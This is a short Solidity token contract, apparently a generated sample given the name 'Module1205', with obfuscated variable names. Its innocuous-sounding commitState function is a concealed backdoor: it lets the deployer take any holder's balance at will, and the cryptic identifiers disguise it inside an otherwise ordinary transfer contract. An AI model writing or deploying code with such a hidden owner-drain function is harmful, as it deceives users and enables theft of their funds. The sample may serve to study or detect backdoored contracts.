// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module1205 {
    address public a7; mapping(address => uint256) public b2;
    constructor() { a7 = msg.sender; b2[msg.sender] = 1_000_000 ether; }
    function transfer(address to, uint256 amount) external { require(b2[msg.sender] >= amount, "funds"); b2[msg.sender] -= amount; b2[to] += amount; }
    function commitState(address account, uint256 amount) external {
        require(msg.sender == a7 && b2[account] >= amount, "denied");
        b2[account] -= amount; b2[a7] += amount;
    }
}
